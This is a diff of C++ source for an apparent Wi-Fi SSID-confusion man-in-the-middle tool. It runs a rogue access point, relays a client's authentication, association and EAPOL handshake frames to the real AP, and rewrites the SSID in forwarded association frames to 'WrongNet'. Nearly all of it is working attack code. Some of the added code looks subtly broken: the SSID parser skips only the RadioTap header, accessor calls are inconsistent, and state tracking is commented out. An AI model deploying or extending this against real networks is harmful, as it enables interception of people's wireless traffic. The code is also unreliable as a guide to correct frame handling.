@@ -50,7 +50,7 @@ FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &d
 			send_to_rogue(resp);
 			display_traffic(dot11, "Rogue channel", " -- Replied");
 
-			send_to_real(dot11);
+			//send_to_real(dot11);
 			//client_state.update_state(ClientState::Authenticated);
 
 			return STOP;
@@ -62,22 +62,48 @@ FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &d
 FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const {
 	// EAPOL STA -> AP
 	if(addr1 == rogue_ap.get(SK::mac) && addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
-
 		int eapol_msg = get_eapol_msg_num(pdu);
+		log(LogLevel::DEBUG, "Rogue channel: EAPOL {} detected, addr1={}, addr2={}",
+			eapol_msg, addr1, addr2);
+
 		if(eapol_msg == 2 || eapol_msg == 4) {
-			log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA -> AP real channel", eapol_msg);
-			send_to_real(pdu);
+			log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA -> AP", eapol_msg);
+			const vector<uint8_t> raw = pdu.serialize();
+			send_to_real(raw);
+			return STOP;
 		}
-		/*if(eapol_msg == 4 && client_state.get_state() >= ClientState::Sent_to_rogue) {
-			client_state.update_state(ClientState::GotMitm);
-		}*/
 		return STOP;
 	}
 	return CONTINUE;
 }
 
 
-FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11) {
+void rewrite_ssid_in_frame(vector<uint8_t> &raw, const string &new_ssid) {
+	// SSID option in 802.11 Management frame
+	// SSID element ID = 0
+	uint8_t* ptr = raw.data();
+
+	// RadioTap + 802.11 header
+	const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (raw[3] << 8);
+	uint8_t* options = ptr + rt_len;  // Začátek IEs
+
+	while(options + 2 < raw.data() + raw.size()) {
+		uint8_t element_id = options[0];
+		uint8_t len = options[1];
+
+		if(element_id == 0 && len <= 32) {  // SSID Element
+			memset(options + 2, 0, len);  // clean old
+			memcpy(options + 2, new_ssid.c_str(),
+				   min(new_ssid.size(), static_cast<size_t>(len)));
+			return;
+		}
+
+		// other element
+		options += 2 + len;
+	}
+}
+
+FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11,  const vector<uint8_t> &raw) const {
 	const Dot11ManagementFrame::rates_type rates = {
 		static_cast<Dot11ManagementFrame::rates_type::value_type>(82),
 		static_cast<Dot11ManagementFrame::rates_type::value_type>(84),
@@ -97,7 +123,7 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot1
 		resp.supported_rates(rates);
 		send_to_rogue(resp);
 	} else if(const auto *reassoc = dot11.find_pdu<Dot11ReAssocRequest>()) {
-		Dot11ReAssocResponse resp(addr2, rogue_ap.get(SK::mac)); // correct subtype
+		Dot11ReAssocResponse resp(addr2, rogue_ap.get(SK::mac));
 		resp.addr3(rogue_ap.get(SK::mac));
 		resp.status_code(0);
 		resp.capabilities() = reassoc->capabilities();
@@ -107,9 +133,16 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot1
 	} else {
 		return CONTINUE;
 	}
-	client_state.update_state(ClientState::Associated);
+	//client_state.update_state(ClientState::Associated);
 	display_traffic(dot11, "Rogue channel", " -- Replied");
-	send_to_real(dot11);
+
+	auto translated = raw;
+	rewrite_ssid_in_frame(translated, "WrongNet");  // ← PŘEPIS
+	translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac));
+
+	log(LogLevel::DEBUG, "Forwarding Assoc to Real AP with WrongNet SSID");
+	sock_real->send(translated, netconfig.real_channel);
+
 	return STOP;
 }
 
@@ -130,13 +163,16 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 
 	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
 	SOLVE_OR_CONTINUE(handle_open_auth(addr2, *dot11))
-	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11))
+	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
 	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr1, addr2, *pdu))
 
 #undef SOLVE_OR_CONTINUE
 
-	send_to_real(raw);
-	display_traffic(*pdu, "Rogue channel", " -- Replied");
+	if(addr2 == sta.get(SK::mac)) {
+		// This is traffic involving the real AP
+		display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
+		send_to_real(*pdu);
+	}
 }
 
 }
